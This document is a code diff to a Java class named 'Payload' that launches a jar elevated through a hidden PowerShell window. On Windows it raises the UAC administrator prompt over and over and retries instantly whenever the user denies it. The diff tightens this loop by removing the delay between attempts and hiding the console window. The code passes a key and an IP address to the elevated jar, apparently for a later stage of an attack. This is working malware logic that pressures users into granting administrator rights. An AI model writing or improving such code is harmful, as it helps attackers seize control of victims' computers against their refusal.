@@ -153,29 +153,31 @@ public class Payload {
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            // Launch via cmd.exe /c start to force the UAC prompt onto the visible desktop
             String psCommand = String.format(
                 "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
                 javaExe, jarPath, key, ip
             );
-            String cmdLine = "cmd.exe /c start \"\" powershell.exe -NoProfile -WindowStyle Hidden -Command \"" + psCommand + "\"";
+            
+            // Build the powershell command to be fully hidden when launching
+            String fullCmd = "powershell.exe -NoProfile -WindowStyle Hidden -Command \"" + psCommand + "\"";
 
             FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
-                log("Triggering UAC via cmd/start...");
+                log("Triggering UAC...");
                 
-                Process p = Runtime.getRuntime().exec(cmdLine);
-                p.waitFor(); 
+                // Execute via cmd /c start so the prompt renders, but the cmd window stays hidden
+                Process p = Runtime.getRuntime().exec("cmd.exe /c start \"\" /b " + fullCmd);
+                p.waitFor();
                 
-                // Wait for the elevated process to delete the lock file
+                // Check every 50ms if the user clicked Yes (lock file deleted)
                 boolean accepted = false;
-                for (int i = 0; i < 100; i++) { 
+                for (int i = 0; i < 600; i++) { 
                     if (!lockFile.exists() || lockFile.delete()) {
                         accepted = true;
                         break;
                     }
-                    Thread.sleep(100);
+                    Thread.sleep(50);
                 }
                 
                 if (accepted) {
@@ -184,7 +186,6 @@ public class Payload {
                     System.exit(0); 
                 } else {
                     log("UAC Denied. Instantly retrying...");
-                    Thread.sleep(100);
                 }
             }
         } catch (Exception e) {
